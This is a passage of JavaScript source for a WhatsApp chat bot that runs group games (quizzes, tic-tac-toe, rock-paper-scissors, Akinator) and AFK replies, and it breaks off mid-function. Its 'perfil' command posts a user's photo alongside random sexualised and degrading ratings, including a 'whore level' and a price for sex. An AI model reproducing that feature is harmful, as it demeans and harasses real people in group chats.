const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
client.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: client.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, client.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessagem.fromObject(messages)],
            type: 'append'
        }
        client.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?desisto|surr?ender)$/i.test(m.text)
            if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Answer the following questions :\n${room.soal}\n\n\nThere is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}
${isWin ? `All Answers Answered` : isSurender ? 'desisto!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            client.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await client.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, client.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await client.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🎮 Guess The Picture 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, client.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await client.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🎮 Guess The Word 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, client.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await client.sendButtonText(m.chat, [{ buttonId: 'guess blank', buttonText: { displayText: 'Guess The Blank' }, type: 1 }], `🎮 Guess The Blank 🎮\n\nCorrect Answer 🎉\n*${deskripsi}*\n\nWant To Play Again? Press The Button Below`, client.user.name, m)
delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await client.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🎮 Guess The Sentence 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, client.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await client.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🎮 Guess The Lyrics 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, client.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
await client.sendButtonText(m.chat, [{ buttonId: 'guess riddle', buttonText: { displayText: 'Guess The Riddle' }, type: 1 }], `🎮 Guess The Riddle 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, client.user.name, m)
delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Wrong answer!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?desisto|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) {  
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'O jogo acabou.',
	    '-2': 'inválida!',
	    '-1': 'Posição inválida!',
	    0: 'Posição inválida!',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `ID da Sala: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Fim de Jogo` : `C: ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Digite *desisto* para desistir e admitir a derrota`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await client.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await client.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    client.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    client.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) client.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) client.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) client.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    client.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) client.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) client.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    client.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Don't tag him!
He's in AFK ${reason ? 'with reason ' + reason : 'no reason'}
During ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
You stop AFK${user.afkReason ? ' after ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
	//menu image randomizer
	let picaks = [flaming,fluming,flarun,flasmurf]
	let picak = picaks[Math.floor(Math.random() * picaks.length)]
	
	//menu doc randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

    
        switch(command) {
            case 'finaki':
        if(args == 'nao') return m.reply('*Puxa não foi desta vez 😔*') 
        m.reply('*SABIA! EU VENCI 🥳*')
        akinator[0][from] = undefined
        fs.writeFileSync('./src/akinator.json', JSON.stringify(akinator, null, 2))
        break
    case 'akinatorr':
        if(args == 'nao') return m.reply('*Até a próxima amigo*') 
        if(akinator[0][from]) return m.reply('*Desculpe-me amigo alguem ja está jogando, aguarde pra chegar sua vez*')
        akinator[0][from] = {
            id: from,
            player: sender,
            game: new Aki({region: 'pt'})
        }
        await akinator[0][from].game.start()
        listMessage = {
            text: akinator[0][from].game.question,
            footer: 'Mostrar opções',
            buttonText: 'Opções',
            title: "Pergunta",
            sections: [{
title: 'Opções',
rows: [{
  rowId: `${prefix}respaki 0`,
  title: 'Sim',
  description: ''
},
{
  rowId: `${prefix}respaki 1`,
  title: 'Não',
  description: ''
},{
  rowId: `${prefix}respaki 2`,
  title: 'Não sei',
  description: ''
},{
  rowId: `${prefix}respaki 3`,
  title: 'Provavelmente sim',
  description: ''
},
{
  rowId: `${prefix}respaki 4`,
  title: 'Provavelmente não',
  description: ''
}]
            }]
        }
        client.sendMessage(from, listMessage)
        fs.writeFileSync('./src/akinator.json', JSON.stringify(akinator, null, 2))
    break
            case 'resetaki':
//if(akinator[0][from] && akinator[0][from].player != sender) return reply('*Não é você que está jogando*')
akinator[0][from] = undefined
fs.writeFileSync('./src/akinator.json', JSON.stringify(akinator, null, 2))
buttons_opts = [
  {buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
  {buttonId: 'akinator nao', buttonText: {displayText: 'Não'}, type: 1},
]
sendbuttonsMessage = {
  text: `*Jogo reiniciado com sucesso! Deseja jogar outra partida*`,
  footerText: 'Sim ou não?',
  buttons: buttons_opts,
  headerType: 1
}
client.sendMessage(from, sendbuttonsMessage)
break
            case 'respaki':
if(!m.message.listResponseMessage) return
if(akinator[0][from] && akinator[0][from].player != sender) return m.reply('*Não é você que está jogando*')
if(args.length < 1) return
await akinator[0][from].game.step(args[0])
if(akinator[0][from].game.progress > 85) {
  await akinator[0][from].game.win()
  teks = `Por acaso seu personagem é ${akinator[0][from].game.answers[0].name}?`
  buttons_opts = [
{buttonId: 'finaki sim', buttonText: {displayText: 'Sim'}, type: 1},
{buttonId: 'finaki nao', buttonText: {displayText: 'Não'}, type: 1},
  ]
  sendbuttonsMessage = {
image: {url: akinator[0][from].game.answers[0].absolute_picture_path},
caption: `Já sei!\n\n${teks}`,
footerText: 'Sim ou não?',
buttons: buttons_opts,
headerType: 1
  }
  client.sendMessage(from, sendbuttonsMessage)
} else {
  listMessage = {
text: akinator[0][from].game.question,
footer: 'Progresso' + akinator[0][from].game.progress,
buttonText: 'Opções',
title: "Pergunta",
sections: [{
    title: 'Opções',
    rows: [{
        rowId: `${prefix}respaki 0`,
        title: 'Sim',
        description: ''
    },
    {
        rowId: `${prefix}respaki 1`,
        title: 'Não',
        description: ''
    },{
        rowId: `${prefix}respaki 2`,
        title: 'Não sei',
        description: ''
    },{
        rowId: `${prefix}respaki 3`,
        title: 'Provavelmente sim',
        description: ''
    },
    {
        rowId: `${prefix}respaki 4`,
        title: 'Provavelmente não',
        description: ''
    },
     {
    rowId: `nada`,
    title: akinator[0][from].game.progress,
    description: ''
}]
}]
  }
  client.sendMessage(from, listMessage)
}
            break
            case 'akinator':
buttons_opts = [
  {buttonId: 'akinatorr sim', buttonText: {displayText: 'Sim'}, type: 1},
  {buttonId: 'akinatorr nao', buttonText: {displayText: 'Não'}, type: 1},
]
sendbuttonsMessage = {
  text: "Olá, sou o akinator",
  footerText: 'Vamos jogar um jogo?',
  buttons: buttons_opts,
  headerType: 1
}
client.sendMessage(from, sendbuttonsMessage)
break
	    case 'afk': {
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} *Already Afk*${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'jogodavelha': case 'tictactoe': {
        	if (!m.isGroup) throw mess.group
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'You are still in the game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Oponente encontrado!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `ID da Sala: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Aguardando @${room.game.currentTurn.split('@')[0]}

Digite *desisto* para desistir da partida`
            if (room.x !== room.o) await client.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await client.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Esperando por um oponente' + (text ? ` Digite o comando ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            client.sendText(m.chat, `Sessão do jogo da velha finalizado(deletado)`, m)
            } else if (!this.game) {
            m.reply(`A sessão não existe`)
            } else throw '?'
            } catch (e) {
            m.reply('danificado')
            }
            }
            break
            // mais jogos
            case 'perfil':{
try {
ppimg = await client.profilePictureUrl(m.sender, 'image')

} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const dptr = `     「 🔥 ~_*PERFIL*_~ 🌈 」
🗒 *Nome* : *${pushname}*
🪀 *Número* : @${sender.split("@")[0]}
🐂 *Nível gado* : *${nivelgador}${nivelgado2r}%*
📱 *Seu Celular* : ${m.key.id.length > 21 ? 'Android 🤣' : m.key.id.substring(0, 2) == '3A' ? 'IOS😂😂😅' : 'Zap zap web 😂😂☝🏼😅'}
😈 *Nível puta* : *${putar}${putar2}%*
😋 *Nível de gostosura* : *${gostosurar}${gostosurar2}%*
🍼 *Valor do programa* : *R$${programa}*

➻ *~_CONSELHO_~* :
${conselho}`
client.sendMessage(from, { image: { url: ppimg }, caption: dptr }, { quoted: fkontak })
}
break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return m.reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `The person you are challenging is playing suit with someone else :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *menantang* @${m.mentionedJid[0].split`@`[0]} *to play suit*

*Please* @${m.mentionedJid[0].split`@`[0]} *to type accept/reject*`
            this.suit[id] = {
            chat: await client.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) client.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
   	
		 
            case 'chat': {
if (!isCreator) throw mess.owner
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
  client.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
  client.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'archive') {
  client.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
  client.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'read') {
  client.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unread') {
  client.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'delete') {
  client.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
            }
            break
	    case 'family100': {
if ('family100'+m.chat in _family100) {
  m.reply('There are still unfinished sessions!')
  throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Answer the following questions :*\n${random.soal}\n\nThere is *${random.jawaban.length}* Answer ${random.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}`.trim()
_family100['family100'+m.chat] = {
  id: 'family100'+m.chat,
  pesan: await client.sendText(m.chat, hasil, m),
  ...random,
  terjawab: Array.from(random.jawaban, () => false),
  hadiah: 6,
}
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'guess': {
if (!args.join(" ")) throw `Example : ${prefix + command} song\n\nOption : \n1.song\n2. picture\n3. saying\n4. sentence\n5. lyrics\n6.food`
if (args[0] === "song") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await client.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
client.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
client.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'picture') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
client.sendImage(m.chat, result.img, `Please answer the question above\n\nDescription : ${result.deskripsi}\nTime : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
client.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess the picture' }, type: 1 }], `Time has run out\nAnswer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,`${global.botname}`, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'word') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anu = await fetchJson('https://raw.githubusercontent.com/DGXeon/fungames/main/GuessTheWord.js')
let result = anu[Math.floor(Math.random() * anu.length)]
client.sendText(m.chat, `Please answer the following question\n\n${result.soal}\nTime : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
client.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `Time Out\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'sentence') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anu = await fetchJson('https://raw.githubusercontent.com/DGXeon/fungames/main/GuessTheSentence.js')
let result = anu[Math.floor(Math.random() * anu.length)]
client.sendText(m.chat, `Please answer the following question\n\n${result.soal}\nTime : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
client.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess the Sentence' }, type: 1 }], `Time Out\nAnswer:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lyrics') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
client.sendText(m.chat, `Fill the missing lyrics below : *${result.soal}*?\nTime : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
client.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `Time Out\nAnswer:  ${tebaklirik[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'guess saying') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
client.sendText(m.chat, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
